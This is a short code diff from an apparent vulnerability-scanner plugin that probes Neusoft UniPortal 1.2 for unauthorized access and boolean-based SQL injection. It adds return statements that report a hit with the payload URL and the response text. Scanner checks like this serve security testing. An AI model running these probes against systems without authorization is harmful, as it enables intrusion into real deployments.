@@ -28,6 +28,7 @@ class uniportal_bypass_priv_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"<a href=SurveyStatisShow.jsp" in req.text:
                 cprint("[+]存在东软UniPortal1.2未授权访问漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "东软UniPortal1.2未授权访问&SQL注入", str(payload), req.text
 
             soup = BeautifulSoup(req.text, "html.parser")
             html = soup.find_all("a")
@@ -41,6 +42,7 @@ class uniportal_bypass_priv_sqli_BaseVerify:
             req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
             if r"ShowText.jsp" in req1.text and r"ShowText.jsp" not in req2.text:
                 cprint("[+]存在东软UniPortal1.2 SQL注入漏洞...(高危)\tpayload: "+falseurl, "red")
+                return True, tureurl, "东软UniPortal1.2未授权访问&SQL注入", str(tureurl), req1.text
             else:
                 cprint("[-]不存在uniportal_bypass_priv_sqli漏洞", "white", "on_grey")
                 return False, None, None, None, None
